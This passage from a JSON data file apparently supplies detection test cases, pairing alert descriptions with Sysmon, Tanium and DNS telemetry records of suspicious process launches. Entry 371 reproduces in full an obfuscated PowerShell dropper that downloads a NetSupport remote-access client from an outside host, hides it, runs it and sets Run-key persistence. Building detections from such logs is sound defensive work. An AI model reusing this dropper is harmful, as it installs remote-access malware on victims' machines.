            "<14>Nov 02 05:17:02 win-server.lunarstiiiness.com Microsoft-Windows-Sysmon[1288]: {\"EventTime\":1730438221,\"Hostname\":\"win-server.lunarstiiiness.com\",\"Keywords\":-9223372036854775808,\"EventType\":\"INFO\",\"SeverityValue\":2,\"Severity\":\"INFO\",\"EventID\":1,\"SourceName\":\"Microsoft-Windows-Sysmon\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"Version\":5,\"Task\":1,\"OpcodeValue\":0,\"RecordNumber\":943296,\"ProcessID\":1288,\"ThreadID\":2884,\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"Domain\":\"NT AUTHORITY\",\"AccountName\":\"SYSTEM\",\"UserID\":\"S-1-5-18\",\"AccountType\":\"User\",\"Message\":\"Process Create:\\r\\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\\r\\nUtcTime: 2024-11-01 05:17:01.033\\r\\nProcessGuid: {BE59402F-31C2-6402-8D01-000000001900}\\r\\nProcessId: 5712\\r\\nImage: D:\\\\Software\\\\nbtscan.exe\\r\\nFileVersion: -\\r\\nDescription: -\\r\\nProduct: -\\r\\nCompany: -\\r\\nOriginalFileName: -\\r\\nCommandLine: nbtscan\\r\\nCurrentDirectory: D:\\\\Software\\\\\\r\\nUser: LUNARSTIIINESS\\\\tim.smith_admin\\r\\nLogonGuid: {BE59402F-2E2D-6402-19D0-DA0000000000}\\r\\nLogonId: 0xDAD019\\r\\nTerminalSessionId: 3\\r\\nIntegrityLevel: High\\r\\nHashes: SHA1=90DA10004C8F6FAFDAA2CF18922670A745564F45,MD5=F01A9A2D1E31332ED36C1A4D2839F412,SHA256=C9D5DC956841E000BFD8762E2F0B48B66C79B79500E894B4EFA7FB9BA17E4E9E,IMPHASH=2FA43C5392EC7923ABABCED078C2F98D\\r\\nParentProcessGuid: {BE59402F-31B3-6402-8901-000000001900}\\r\\nParentProcessId: 6016\\r\\nParentImage: C:\\\\Windows\\\\System32\\\\cmd.exe\\r\\nParentCommandLine: \\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\" \\r\\nParentUser: LUNARSTIIINESS\\\\tim.smith_admin\",\"Category\":\"Process Create (rule: ProcessCreate)\",\"Opcode\":\"Info\",\"RuleName\":\"technique_id=T1059,technique_name=Command-Line Interface\",\"UtcTime\":\"2024-11-01 05:17:01.033\",\"ProcessGuid\":\"{BE59402F-31C2-6402-8D01-000000001900}\",\"Image\":\"D:\\\\Software\\\\nbtscan.exe\",\"FileVersion\":\"-\",\"Description\":\"-\",\"Product\":\"-\",\"Company\":\"-\",\"OriginalFileName\":\"-\",\"CommandLine\":\"nbtscan\",\"CurrentDirectory\":\"D:\\\\Software\\\\\",\"User\":\"LUNARSTIIINESS\\\\tim.smith_admin\",\"LogonGuid\":\"{BE59402F-2E2D-6402-19D0-DA0000000000}\",\"LogonId\":\"0xdad019\",\"TerminalSessionId\":\"3\",\"IntegrityLevel\":\"High\",\"Hashes\":\"SHA1=90DA10004C8F6FAFDAA2CF18922670A745564F45,MD5=F01A9A2D1E31332ED36C1A4D2839F412,SHA256=C9D5DC956841E000BFD8762E2F0B48B66C79B79500E894B4EFA7FB9BA17E4E9E,IMPHASH=2FA43C5392EC7923ABABCED078C2F98D\",\"ParentProcessGuid\":\"{BE59402F-31B3-6402-8901-000000001900}\",\"ParentProcessId\":\"6016\",\"ParentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"ParentCommandLine\":\"\\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\" \",\"ParentUser\":\"LUNARSTIIINESS\\\\tim.smith_admin\",\"EventReceivedTime\":1730438222,\"SourceModuleName\":\"in_sysmon\",\"SourceModuleType\":\"im_msvistalog\"}\r\nudm.principal.process.file.full_path: C:\\Windows\\System32\\cmd.exe\r\nudm.principal.process.file.sha256: 935c1861df1f4018d698e8b65abfa02d7e9037d8f68ca3c2065b6ca165d44ad2"
        ]
    },
    "360": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activitysonic.exe launched by explorer.exe",
        "ini_data": [
            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\sonic.exe\",\"Company\":\"-\",\"Computer\":\"DESKTOPS\",\"CurrentDirectory\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\\",\"Description\":\" \",\"EventID\":1,\"FileVersion\":\"1.0.0.0\",\"Hashes\":\"MD5=A55DB6BFA7DEDECF7365567B803CB013,SHA256=01153CFE9FE9F1C3460E02D254BBE49B7B07C343061B7630234D95948D8F6106,IMPHASH=31E8556425EF4035DBFC678A002AD91B\",\"Hostname\":\"oscar.wild.desktop\",\"Image\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\sonic.exe\",\"IntegrityLevel\":\"Medium\",\"Level\":4,\"LogonGuid\":\"{C784477D-83CA-6536-C5CD-030000000000}\",\"LogonId\":\"0x3cdc5\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"GorgerousOnce.exe\",\"ParentCommandLine\":\"C:\\\\Windows\\\\Explorer.EXE\",\"ParentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"ParentProcessGuid\":\"{C784477D-83CA-6536-6B00-000000004A00}\",\"ParentProcessId\":\"4966\",\"ProcessGuid\":\"{C784477D-969B-653B-B006-000000004A00}\",\"ProcessID\":2306,\"ProcessId\":\"10146\",\"Product\":\"-\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":1379906,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":706,\"User\":\"DESKTOPS\\\\oscar.wild\",\"UserID\":\"S-1-5-18\",\"UtcTime\":\"2024-11-19 05:32:05.116\",\"Version\":5}\r\nudm.principal.process.file.full_path: C:\\Windows\\explorer.exe"
        ]
    },
    "361": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityexecutable.exe launched by sandbox-control.exe",
        "ini_data": [
            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"\\\"C:\\\\Users\\\\stevemorris\\\\Desktop\\\\executable.exe\\\" \",\"Company\":\"-\",\"Computer\":\"DESKTOP-SM\",\"CurrentDirectory\":\"C:\\\\Users\\\\stevemorris\\\\Desktop\\\\\",\"Description\":\"-\",\"EventID\":1,\"FileVersion\":\"-\",\"Hashes\":\"MD5=71826BA081E303866CE2A2534491A2F7,SHA256=62099532750DAD1054B127689680C38590033FA0BDFA4FB40C7B4DCB2607FB11,IMPHASH=AFCDF79BE1557326C854B6E20CB900A7\",\"Hostname\":\"stevemorris-pc\",\"Image\":\"C:\\\\Users\\\\stevemorris\\\\Desktop\\\\executable.exe\",\"IntegrityLevel\":\"High\",\"Level\":4,\"LogonGuid\":\"{C784477D-A5DD-61A4-355F-030000000000}\",\"LogonId\":\"0x35f35\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"-\",\"ParentCommandLine\":\"\\\"sandbox-control.exe\\\"\",\"ParentImage\":\"sandbox-control.exe\",\"ParentProcessGuid\":\"{C784477D-A6BC-61A4-F705-000000003C00}\",\"ParentProcessId\":\"6400\",\"ProcessGuid\":\"{C784477D-F8D0-6221-2706-000000003C00}\",\"ProcessID\":2200,\"ProcessId\":\"3848\",\"Product\":\"-\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":84589,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":3056,\"User\":\"DESKTOP-SM\\\\stevemorris\",\"UserID\":\"S-1-5-12-783622181-14434791-6080415151-691320\",\"UtcTime\":\"2025-01-01 05:32:08.000000\",\"Version\":5}\r\nudm.principal.process.file.full_path: sandbox-control.exe"
        ]
    },
    "362": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activitysonic.exe launched by explorer.exe",
        "ini_data": [
            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\sonic.exe\",\"Company\":\"-\",\"Computer\":\"DESKTOPS\",\"CurrentDirectory\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\\",\"Description\":\" \",\"EventID\":1,\"FileVersion\":\"1.0.0.0\",\"Hashes\":\"MD5=A55DB6BFA7DEDECF7365567B803CB013,SHA256=01153CFE9FE9F1C3460E02D254BBE49B7B07C343061B7630234D95948D8F6106,IMPHASH=31E8556425EF4035DBFC678A002AD91B\",\"Hostname\":\"oscar.wild.desktop\",\"Image\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\sonic.exe\",\"IntegrityLevel\":\"Medium\",\"Level\":4,\"LogonGuid\":\"{C784477D-83CA-6536-C5CD-030000000000}\",\"LogonId\":\"0x3cdc5\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"GorgerousOnce.exe\",\"ParentCommandLine\":\"C:\\\\Windows\\\\Explorer.EXE\",\"ParentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"ParentProcessGuid\":\"{C784477D-83CA-6536-6B00-000000004A00}\",\"ParentProcessId\":\"4966\",\"ProcessGuid\":\"{C784477D-969B-653B-B006-000000004A00}\",\"ProcessID\":2306,\"ProcessId\":\"10146\",\"Product\":\"-\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":1379906,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":706,\"User\":\"DESKTOPS\\\\oscar.wild\",\"UserID\":\"S-1-5-18\",\"UtcTime\":\"2024-12-17 05:32:35.116\",\"Version\":5}\r\nudm.principal.process.file.full_path: C:\\Windows\\explorer.exe"
        ]
    },
    "363": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityClient Update.exe launched by 6015",
        "ini_data": [
            "{\"metadata\":{\"logType\":\"PROCESS_LAUNCH\",\"productVersion\":\"1.2\",\"vendorName\":\"Tanium\",\"productName\":\"Tanium Event Emitter\",\"eventTimestamp\":\"2024-10-08T08:17:50.717+00:00\"},\"principal\":{\"process\":{\"pid\":\"47010\",\"parentPid\":\"6015\",\"productSpecificProcessId\":\"47010\",\"productSpecificParentProcessId\":\"6015\",\"file\":{\"fullPath\":\"C:\\\\Users\\\\alice\\\\Downloads\\\\Client Update.exe\",\"md5\":\"17150a137c43235ad07011b552f9ff27\"}},\"hostname\":\"alice-benjamin-pc\",\"assetId\":\"alice-benjamin-pc\",\"user\":{\"userid\":\"alice\",\"groupid\":none}}}"
        ]
    },
    "364": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityclient32.exe launched by explorer.exe",
        "ini_data": [
            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"\\\"C:\\\\Users\\\\lisawalker\\\\AppData\\\\Roaming\\\\OfficeStartup\\\\client32.exe\\\" \",\"Company\":\"NetSupport Ltd\",\"Computer\":\"wins-d19\",\"CurrentDirectory\":\"C:\\\\Users\\\\lisawalker\\\\AppData\\\\Roaming\\\\OfficeStartup\\\\\",\"Description\":\"NetSupport Client Application\",\"EventID\":1,\"FileVersion\":\"V12.70\",\"Hashes\":\"MD5=877F5E83FB39DE16FA8BBD93BA9F07F1,SHA256=418744FA1ADE539C280461387DF87DDA6BF84C7D755EBBBDC6123FD5659F9467,IMPHASH=A9D50692E95B79723F3E76FCF70D023E\",\"Hostname\":\"wins-d19\",\"Image\":\"C:\\\\Users\\\\lisawalker\\\\AppData\\\\Roaming\\\\OfficeStartup\\\\client32.exe\",\"IntegrityLevel\":\"High\",\"Level\":4,\"LogonGuid\":\"{C784477D-081A-6482-DB4F-040000000000}\",\"LogonId\":\"0x44fdb\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"client32.exe\",\"ParentCommandLine\":\"C:\\\\Windows\\\\Explorer.EXE\",\"ParentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"ParentProcessGuid\":\"{C784477D-081A-6482-8000-000000004A00}\",\"ParentProcessId\":\"4668\",\"ProcessGuid\":\"{C784477D-B0FA-648B-BC0A-000000004A00}\",\"ProcessID\":2240,\"ProcessId\":\"6156\",\"Product\":\"NetSupport Manager\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":749905,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":2996,\"User\":\"wins-d19\\\\lisawalker\",\"UserID\":\"S-1-5-18\",\"UtcTime\":\"2025-01-03 05:35:10.000\",\"Version\":5}\r\nudm.principal.process.file.full_path: C:\\Windows\\explorer.exe"
        ]
    },
    "365": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityprogram.exe launched by explorer.exe",
        "ini_data": [
            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"\\\"C:\\\\Users\\\\oscar.wild\\\\Desktop\\\\program.exe\\\"\",\"Company\":\"-\",\"Computer\":\"DESKTOPS\",\"CurrentDirectory\":\"C:\\\\Users\\\\oscar.wild\\\\Desktop\\\\\",\"Description\":\"-\",\"EventID\":1,\"FileVersion\":\"-\",\"Hashes\":\"MD5=DC9B8E9B20BB6D18F902A7460BF0F92C,SHA256=0D6518769E10895CC1880040FB0680520CB179D37624BD2685368414B4A6E4EB,IMPHASH=96BAACC90461FCD4B5D9FCC50047C098\",\"Hostname\":\"oscar.wild.desktop\",\"Image\":\"C:\\\\Users\\\\oscar.wild\\\\Desktop\\\\program.exe\",\"IntegrityLevel\":\"High\",\"Level\":4,\"LogonGuid\":\"{C784477D-CFB4-648A-FCF7-030000000000}\",\"LogonId\":\"0x3f7fc\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"-\",\"ParentCommandLine\":\"C:\\\\Windows\\\\Explorer.EXE\",\"ParentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"ParentProcessGuid\":\"{C784477D-CFB4-648A-6900-000000004400}\",\"ParentProcessId\":\"4892\",\"ProcessGuid\":\"{C784477D-B8D5-6517-2F06-000000004400}\",\"ProcessID\":2320,\"ProcessId\":\"8160\",\"Product\":\"-\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":1366184,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":1924,\"User\":\"DESKTOPS\\\\oscar.wild\",\"UserID\":\"S-1-5-18\",\"UtcTime\":\"2024-12-22 05:32:32.136\",\"Version\":5}\r\nudm.principal.process.file.full_path: C:\\Windows\\explorer.exe"
        ]
    },
    "366": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityqClNkVtHKskoh.exe",
        "ini_data": [
            "□%□□□□□□□□□□□□□□ □N2□Chronicle Internal□'□#ellen-wysocki-windows-pc.corp.local\"□*f\"d□□16272□Q□ 27444605dff20d1e704b5cf682d035d2*-C:\\Users\\AppData\\Local\\Temp\\qClNkVtHKskoh.exe*□ID:16272"
        ]
    },
    "367": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityexecutable.exe launched by sandbox-control.exe",
        "ini_data": [
            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"\\\"C:\\\\Users\\\\stevemorris\\\\Desktop\\\\executable.exe\\\" \",\"Company\":\"-\",\"Computer\":\"DESKTOP-SM\",\"CurrentDirectory\":\"C:\\\\Users\\\\stevemorris\\\\Desktop\\\\\",\"Description\":\"-\",\"EventID\":1,\"FileVersion\":\"-\",\"Hashes\":\"MD5=71826BA081E303866CE2A2534491A2F7,SHA256=62099532750DAD1054B127689680C38590033FA0BDFA4FB40C7B4DCB2607FB11,IMPHASH=AFCDF79BE1557326C854B6E20CB900A7\",\"Hostname\":\"stevemorris-pc\",\"Image\":\"C:\\\\Users\\\\stevemorris\\\\Desktop\\\\executable.exe\",\"IntegrityLevel\":\"High\",\"Level\":4,\"LogonGuid\":\"{C784477D-A5DD-61A4-355F-030000000000}\",\"LogonId\":\"0x35f35\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"-\",\"ParentCommandLine\":\"\\\"sandbox-control.exe\\\"\",\"ParentImage\":\"sandbox-control.exe\",\"ParentProcessGuid\":\"{C784477D-A6BC-61A4-F705-000000003C00}\",\"ParentProcessId\":\"6400\",\"ProcessGuid\":\"{C784477D-F8D0-6221-2706-000000003C00}\",\"ProcessID\":2200,\"ProcessId\":\"3848\",\"Product\":\"-\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":84589,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":3056,\"User\":\"DESKTOP-SM\\\\stevemorris\",\"UserID\":\"S-1-5-12-783622181-14434791-6080415151-691320\",\"UtcTime\":\"2025-01-06 05:32:06.000000\",\"Version\":5}\r\nudm.principal.process.file.full_path: sandbox-control.exe"
        ]
    },
    "368": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityClient Update.exe launched by 45012",
        "ini_data": [
            "{\"metadata\":{\"logType\":\"PROCESS_LAUNCH\",\"productVersion\":\"1.2\",\"vendorName\":\"Tanium\",\"productName\":\"Tanium Event Emitter\",\"eventTimestamp\":\"2024-09-18T08:17:46.164+00:00\"},\"principal\":{\"process\":{\"pid\":\"27306\",\"parentPid\":\"45012\",\"productSpecificProcessId\":\"27306\",\"productSpecificParentProcessId\":\"45012\",\"file\":{\"fullPath\":\"C:\\\\Users\\\\alice\\\\Downloads\\\\Client Update.exe\",\"md5\":\"17150a137c43235ad07011b552f9ff27\"}},\"hostname\":\"alice-benjamin-pc\",\"assetId\":\"alice-benjamin-pc\",\"user\":{\"userid\":\"alice\",\"groupid\":none}}}"
        ]
    },
    "369": {
        "alert_brief": "Alert on known Hash querying a known hostname with VT Relationshipsto manygoodnews.com",
        "ini_data": [
            "{\"event_simpleName\":\"DnsRequest\",\"ContextTimeStamp\":\"1732066344\",\"ConfigStateHash\":\"9542156506\",\"ContextProcessId\":\"8960054625103\",\"DomainName\":\"manygoodnews.com\",\"ContextThreadId\":\"967634005093619\",\"aip\":\"10.8.13.29\",\"QueryStatus\":\"87\",\"InterfaceIndex\":\"0\",\"ConfigBuild\":\"1007.3.0011809.1\",\"event_platform\":\"Win\",\"DnsRequestCount\":\"1\",\"DualRequest\":\"1\",\"Entitlements\":\"15\",\"name\":\"DnsRequestV4\",\"id\":\"217339fb-172e-4bf1-a397-e92639d6080a\",\"EffectiveTransmissionClass\":\"3\",\"aid\":\"e2327adb69e83e6f9deaf40da1e4c653\",\"timestamp\":\"1732080745\",\"cid\":\"b140194b2ba51f0ba1e93ba0187310b2\",\"RequestType\":\"1\",\"UserName\":\"adablack\"}\r\nudm.principal.process.file.full_path: \\Device\\HarddiskVolume1\\Program Files\\C:\\Users\\adablack\\Downloads\\Client Update.exe\r\nudm.principal.process.file.sha256: c10cd1c78c180ba657e3921ee9421b9abd5b965c4cdfaa94a58e383b45bb72ca"
        ]
    },
    "370": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityqClNkVtHKskoh.exe",
        "ini_data": [
            "□%□□□□□□□□□□□□□□ □N2□Chronicle Internal□#□□susan-tan-windows-pc.corp.local\"□*f\"d□□52547□Q□ 27444605dff20d1e704b5cf682d035d2*-C:\\Users\\AppData\\Local\\Temp\\qClNkVtHKskoh.exe*□ID:52547"
        ]
    },
    "371": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityclient32.exe launched by powershell.exe",
        "ini_data": [
            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"\\\"C:\\\\Users\\\\lisawalker\\\\AppData\\\\Roaming\\\\OfficeStartup\\\\client32.exe\\\" \",\"Company\":\"NetSupport Ltd\",\"Computer\":\"wins-d19\",\"CurrentDirectory\":\"C:\\\\Users\\\\lisawalker\\\\AppData\\\\Roaming\\\\OfficeStartup\\\\\",\"Description\":\"NetSupport Client Application\",\"EventID\":1,\"FileVersion\":\"V12.70\",\"Hashes\":\"MD5=877F5E83FB39DE16FA8BBD93BA9F07F1,SHA256=418744FA1ADE539C280461387DF87DDA6BF84C7D755EBBBDC6123FD5659F9467,IMPHASH=A9D50692E95B79723F3E76FCF70D023E\",\"Hostname\":\"wins-d19\",\"Image\":\"C:\\\\Users\\\\lisawalker\\\\AppData\\\\Roaming\\\\OfficeStartup\\\\client32.exe\",\"IntegrityLevel\":\"High\",\"Level\":4,\"LogonGuid\":\"{C784477D-081A-6482-DB4F-040000000000}\",\"LogonId\":\"0x44fdb\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"client32.exe\",\"ParentCommandLine\":\"\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\" -ExecutionPolicy Bypass -Command \\\"cd $env:AppData; $Z1P0r='R0k3r.zip'; $eXp4r0cH=Get-Command expand-archive -ErrorAction SilentlyContinue; $p4NteCh=$env:APPDATA+'\\\\'+$Z1P0r; $lI0n3k='https://a.ezydict.com/4th_2.zip'; $r1N4m='OfficeStartup'; $b1tS1iT=Get-Command Start-BitsTransfer -ErrorAction SilentlyContinue; $b1tSiRcDm = 'bitsadmin.exe /transfer MeDoW /download /priority normal '+$lI0n3k+' '+$p4NteCh; $peS1zP=$env:APPDATA+'\\\\'+$r1N4m; if ($eXp4r0cH) {if ($b1tS1iT) {Start-BitsTransfer -Source $lI0n3k -Destination $p4NteCh;} else {Invoke-Expression -Command $b1tSiRcDm}; expand-archive -path $p4NteCh -destinationpath $peS1zP; Remove-Item -path $p4NteCh;} else {$f1L1es=@('AudioCapture.dll', 'client32.exe', 'client32.ini', 'HTCTL32.DLL', 'msvcr100.dll', 'nskbfltr.inf', 'NSM.LIC', 'pcicapi.dll', 'PCICHEK.DLL', 'PCICL32.DLL', 'remcmdstub.exe', 'TCCTL32.DLL'); $lI0n3k2='http://YOUR.LINK/files/'; New-Item -Path $env:APPDATA -Name $r1N4m -ItemType 'directory'; if ($b1tS1iT) {$f1L1es | ForEach-Object {$s10r13s=$lI0n3k2+$_; $1dus1T=$peS1zP+'\\\\'+$_; Start-BitsTransfer -Source $s10r13s -Destination $1dus1T; }; } else { $f1L1es | ForEach-Object { $s10r13s=$lI0n3k2+$_; $1dus1T=$peS1zP+'\\\\'+$_; $b1tSiRcDm2='bitsadmin.exe /transfer MeDoW /download /priority normal '+$s10r13s+' '+$1dus1T; Invoke-Expression -Command $b1tSiRcDm2; }; }; }; $F1l1ed3=Get-Item $peS1zP -Force; $F1l1ed3.attributes='Hidden'; cd $peS1zP; start client32.exe; $F33Sr=$peS1zP+'\\\\client32.exe'; New-ItemProperty -Path 'HKCU:\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run' -Name $r1N4m -Value $F33Sr  -PropertyType 'String'; #g7Vc*-Jh7tZPfY0q6P5D5o15GdlrN#Y7-mQOJpX*i$pocw(-ErQELxY\\u0026de$r0xwndS-WV3PLGJ%5zWmLeyAPpYrP*#qgHDM=7UOXjaCfWx=8nWHx_sEFQE%tw1R)g7A\\u0026)mBA6nJeZiFOS=Zh#DbY^=WJyZDO2!XWKJGFqFa-$s*agin!r0kd#f!^RPu@mnF5NaBx6$fE$T\\u0026d6kyj3\\u0026vFok--dte8=1hK!QM-M$8m1C@n%OO%lq$1iaeWW5SX1aBcfkAi\\u0026UwPe_xOHnJiEct^1VBmC2EJy3uw_Zi5(eis^88NYX\\u00267n\\u0026mf%#iy0fVL\\u0026T_eRg-S8pE(0qg=MaIDD(Spzk37l7hMRe\\u0026Q@0twVYvUbE=hnofn@AA*Y(Sz$oK!J382C00v^yZSnMlyL6CVD!=T-s)*uFi%OxVSNzxSj_=%lOWdZm\\u0026HNCi$C+Ar9Ype=-RxmJsdwSEMjJ7@sT@A^vi4+jebdE\\u0026W_Uxbgc\\u0026j2G1KjeA!=\\u0026yH$B_bHLM+Bpn4hY6$pnFWXPCr4JrlKYo(Pra)eeS_L3d=sopqXgG^H+#j*l!zvex+%J#T8cZM\\u0026Y((gzD7HiCQJ(-9bRCrh6nV+c7eiQiQ_h6ywU0P3AUtnzlGdq6C$*GS$^(=7\\u0026$KnWWpsczhj@VG6(+frmeyyBNnQawJE-q(V3tEo=gkOq2b5hXIu9+AjgmHra@j07QroSPC2YC55!IQi@Y=t-eUJav@Wrd8M%oUXixYa0ftlsa@c6iWW(Q_vCl_)lDr\\u0026CzRHa^\\u0026qTFyM5CiXjkxQ6Pn6zNT_Cd6Cqv7F^ACC7qKAw7JPm^6K_Zp+wPr(V(l0k@qhe0HTdjB+lJYN*@ICyrrUAmA8DVa\\u0026c9xcq_+-T#zfYDP!d6!TOF%\\u0026R1eX%oMdi3a3_32Yq*njTDjsVs*PwD)L#e4)bV@dxM\\u0026%1BwbsZvdlYka=j+fe9*niSr1C(1(E!K!9!HBGfvAG%US=ipYlC\\u0026eA(4)lN3t^I3hMWVWPxMWlJSiCI3n5yTPYp$ni5pQMGH@-#\\u0026#^_k(d6UCVqtqpC!4^#TfS@8s\\u0026QA^cEZe!jXJR4_6uq3Y-lHr0D_hkxn9LMN$RY#ugP^B2kzoQU(cdqJ5Y+igS1fQ0h=87xG_j$XS)6J3r*((T6+!Fuq+L@@(81_dZyXPn3E9oEiZca9A0x7=@q1qyeN93JFFXP4lJk^8n1iABAm\\u0026PdofW\\u0026hXHfFC!kxz(PvTTNIuk6G^l6=OqnhXW_1hD_GYo\\u0026=RH\\u0026TpLTSj^VoPBPfSYFKxoPXNN@R31wLxUsMeyVieYz*rRUBFQTkp3Me8eC516O5^jvvdn3\\u0026D$$z17mWM=+1C+FjF\\\"\",\"ParentImage\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\"ParentProcessGuid\":\"{C784477D-B0D6-648B-B80A-000000004A00}\",\"ParentProcessId\":\"6632\",\"ProcessGuid\":\"{C784477D-B0F2-648B-BA0A-000000004A00}\",\"ProcessID\":2240,\"ProcessId\":\"2352\",\"Product\":\"NetSupport Manager\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":749896,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":2996,\"User\":\"wins-d19\\\\lisawalker\",\"UserID\":\"S-1-5-18\",\"UtcTime\":\"2024-10-11 04:34:37.000\",\"Version\":5}\r\nudm.principal.process.file.full_path: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
        ]
    },
    "372": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityexecutable.exe launched by sandbox-control.exe",
        "ini_data": [
            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"\\\"C:\\\\Users\\\\stevemorris\\\\Desktop\\\\executable.exe\\\" \",\"Company\":\"-\",\"Computer\":\"DESKTOP-SM\",\"CurrentDirectory\":\"C:\\\\Users\\\\stevemorris\\\\Desktop\\\\\",\"Description\":\"-\",\"EventID\":1,\"FileVersion\":\"-\",\"Hashes\":\"MD5=71826BA081E303866CE2A2534491A2F7,SHA256=62099532750DAD1054B127689680C38590033FA0BDFA4FB40C7B4DCB2607FB11,IMPHASH=AFCDF79BE1557326C854B6E20CB900A7\",\"Hostname\":\"stevemorris-pc\",\"Image\":\"C:\\\\Users\\\\stevemorris\\\\Desktop\\\\executable.exe\",\"IntegrityLevel\":\"High\",\"Level\":4,\"LogonGuid\":\"{C784477D-A5DD-61A4-355F-030000000000}\",\"LogonId\":\"0x35f35\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"-\",\"ParentCommandLine\":\"\\\"sandbox-control.exe\\\"\",\"ParentImage\":\"sandbox-control.exe\",\"ParentProcessGuid\":\"{C784477D-A6BC-61A4-F705-000000003C00}\",\"ParentProcessId\":\"6400\",\"ProcessGuid\":\"{C784477D-F8D0-6221-2706-000000003C00}\",\"ProcessID\":2200,\"ProcessId\":\"3848\",\"Product\":\"-\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":84589,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":3056,\"User\":\"DESKTOP-SM\\\\stevemorris\",\"UserID\":\"S-1-5-12-783622181-14434791-6080415151-691320\",\"UtcTime\":\"2024-12-02 05:32:03.000000\",\"Version\":5}\r\nudm.principal.process.file.full_path: sandbox-control.exe"
        ]
    },
    "373": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityprogram.exe launched by explorer.exe",
        "ini_data": [
